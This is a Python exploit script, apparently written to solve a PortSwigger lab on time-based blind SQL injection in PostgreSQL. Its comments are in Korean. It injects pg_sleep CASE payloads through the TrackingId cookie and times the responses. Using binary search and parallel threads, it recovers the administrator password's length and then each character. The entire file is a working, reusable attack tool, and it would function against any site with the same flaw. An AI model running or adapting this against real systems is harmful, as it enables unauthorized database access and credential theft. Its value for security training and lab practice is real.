#!/usr/bin/env python3
"""
Blind SQL Injection - Time Delays & Information Retrieval (PostgreSQL)
PortSwigger Lab: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

취약점 위치: TrackingId 쿠키
판별 기준:  응답 시간 (SLEEP_SECONDS 이상 지연 → 조건 참)
주입 대상:  administrator 계정의 password
DB:         PostgreSQL

핵심 페이로드 구조:
  ' AND EXISTS(SELECT 1 FROM pg_sleep(
      CASE WHEN (<조건>) THEN {sleep}
           ELSE 0
      END
  ))--

  - 조건이 참 → pg_sleep({sleep}) 실행 → 응답 지연
  - 조건이 거짓 → pg_sleep(0) 실행 → 즉시 응답

011 (응답 내용), 012 (HTTP 상태 코드), 013 (에러 메시지)와 달리
응답 본문·상태 코드에 아무 차이 없이 오직 응답 시간만으로 판별한다.
"""

import argparse
import sys
import time
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHARSET = "".join(chr(code) for code in range(33, 127) if chr(code) != "'")

SLEEP_SECONDS = 5     # 조건 참일 때 유발할 지연 시간 (초)
DELAY_THRESHOLD = 3   # 이 값(초) 이상이면 조건 참으로 판정 (네트워크 지연 여유 포함)


def send_request(session_cookie: str, url: str, tracking_id: str, payload: str) -> float:
    """TrackingId 쿠키에 페이로드를 삽입하고 응답 소요 시간(초)을 반환한다."""
    cookies = {"TrackingId": f"{tracking_id}{payload}", "session": session_cookie}
    start = time.monotonic()
    requests.get(url, cookies=cookies, verify=False, timeout=SLEEP_SECONDS + 15)
    return time.monotonic() - start


def is_true_condition(elapsed: float) -> bool:
    """응답 시간이 임계값 이상이면 조건이 참이었다고 판정한다."""
    return elapsed >= DELAY_THRESHOLD


def build_sleep_payload(condition: str) -> str:
    """조건이 참일 때만 pg_sleep을 유발하는 페이로드를 생성한다."""
    return (
        f"' AND EXISTS(SELECT 1 FROM pg_sleep("
        f"CASE WHEN ({condition}) THEN {SLEEP_SECONDS} ELSE 0 END"
        f"))--"
    )


def check_vulnerability(session_cookie: str, url: str, tracking_id: str) -> bool:
    """항상 참인 조건과 거짓인 조건의 응답 시간 차이로 취약점을 확인한다."""
    true_elapsed  = send_request(session_cookie, url, tracking_id,
                                 build_sleep_payload("1=1"))
    false_elapsed = send_request(session_cookie, url, tracking_id,
                                 build_sleep_payload("1=2"))
    return is_true_condition(true_elapsed) and not is_true_condition(false_elapsed)


def get_password_length(session_cookie: str, url: str, tracking_id: str, max_len: int) -> int:
    """이진 탐색으로 administrator 비밀번호 길이를 찾는다."""
    lower_bound, upper_bound = 1, max_len
    while lower_bound < upper_bound:
        midpoint = (lower_bound + upper_bound) // 2
        payload = (
            f"' AND EXISTS(SELECT 1 FROM pg_sleep("
            f"CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')>{midpoint}"
            f" THEN {SLEEP_SECONDS} ELSE 0 END"
            f"))--"
        )
        elapsed = send_request(session_cookie, url, tracking_id, payload)
        if is_true_condition(elapsed):
            lower_bound = midpoint + 1
        else:
            upper_bound = midpoint
    return lower_bound


def get_char_at(session_cookie: str, url: str, tracking_id: str, pos: int) -> str:
    """이진 탐색으로 비밀번호의 pos번째 문자를 찾는다."""
    lower_bound, upper_bound = 0, len(CHARSET) - 1
    while lower_bound < upper_bound:
        midpoint = (lower_bound + upper_bound) // 2
        mid_char = CHARSET[midpoint]
        payload = (
            f"' AND EXISTS(SELECT 1 FROM pg_sleep("
            f"CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)>'{mid_char}'"
            f" THEN {SLEEP_SECONDS} ELSE 0 END"
            f"))--"
        )
        elapsed = send_request(session_cookie, url, tracking_id, payload)
        if is_true_condition(elapsed):
            lower_bound = midpoint + 1
        else:
            upper_bound = midpoint

    candidate = CHARSET[lower_bound]
    verify_payload = (
        f"' AND EXISTS(SELECT 1 FROM pg_sleep("
        f"CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{candidate}'"
        f" THEN {SLEEP_SECONDS} ELSE 0 END"
        f"))--"
    )
    elapsed = send_request(session_cookie, url, tracking_id, verify_payload)
    return candidate if is_true_condition(elapsed) else "?"


def extract_password(session_cookie: str, url: str, tracking_id: str, length: int, workers: int) -> str:
    """각 위치의 문자를 병렬로 추출한다."""
    password = ["?"] * length

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {
            executor.submit(get_char_at, session_cookie, url, tracking_id, pos): pos - 1
            for pos in range(1, length + 1)
        }
        completed = 0
        for future in as_completed(futures):
            index = futures[future]
            password[index] = future.result()
            completed += 1
            print(f"\r[*] 진행: {''.join(password)} ({completed}/{length})", end="", flush=True)

    print()
    return "".join(password)


def main():
    global SLEEP_SECONDS, DELAY_THRESHOLD

    parser = argparse.ArgumentParser(description="Blind SQLi — Time Delays 정보 추출기 (PostgreSQL)")
    parser.add_argument("url",          help="랩 URL (예: https://xxxx.web-security-academy.net)")
    parser.add_argument("tracking_id",  help="정상 TrackingId 쿠키 값")
    parser.add_argument("--workers",    type=int, default=5,
                        help=f"병렬 스레드 수 (기본: 5, 과도하면 서버 부하 및 오탐 발생)")
    parser.add_argument("--max-len",    type=int, default=50,
                        help="비밀번호 최대 길이 탐색 범위 (기본: 50)")
    parser.add_argument("--sleep",      type=int, default=SLEEP_SECONDS,
                        help=f"조건 참일 때 유발할 지연 시간 초 (기본: {SLEEP_SECONDS})")
    parser.add_argument("--threshold",  type=int, default=DELAY_THRESHOLD,
                        help=f"참 판정 임계값 초 (기본: {DELAY_THRESHOLD})")
    args = parser.parse_args()

    SLEEP_SECONDS   = args.sleep
    DELAY_THRESHOLD = args.threshold

    session_cookie = requests.get(args.url, verify=False, timeout=15).cookies.get("session", "")

    print(f"[설정] 지연 시간: {SLEEP_SECONDS}초 / 판정 임계값: {DELAY_THRESHOLD}초 / 스레드: {args.workers}")

    print("[1] 취약점 확인 중...")
    if not check_vulnerability(session_cookie, args.url, args.tracking_id):
        print("[-] 취약점이 확인되지 않았습니다. TrackingId 또는 URL을 확인하세요.")
        sys.exit(1)
    print("[+] 취약점 확인 완료 (응답 시간 차이 존재)")

    print("[2] 비밀번호 길이 탐색 중...")
    length = get_password_length(session_cookie, args.url, args.tracking_id, args.max_len)
    print(f"[+] 비밀번호 길이: {length}")

    print(f"[3] 비밀번호 추출 중...")
    password = extract_password(session_cookie, args.url, args.tracking_id, length, args.workers)

    print(f"\n[+] administrator 비밀번호: {password}")


if __name__ == "__main__":
    main()
